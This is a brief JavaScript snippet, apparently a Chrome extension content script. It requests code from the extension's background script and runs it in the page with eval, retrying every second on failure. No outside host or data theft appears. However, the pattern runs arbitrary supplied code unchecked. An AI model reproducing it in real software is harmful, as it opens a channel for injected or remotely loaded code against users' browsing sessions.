var loaded = false;
var loadscript = function() {
    if (!loaded) {
        try {
            chrome.runtime.sendMessage("loadscript", function (message) {
                try {
                    eval.call(window, message);
                    loaded = true;
                } catch (e) {
                    console.error(e);
                    setTimeout(loadscript, 1000);
                }
            });
        } catch (e) {
            console.error(e);
            setTimeout(loadscript, 1000);
        }
    }
}
loadscript();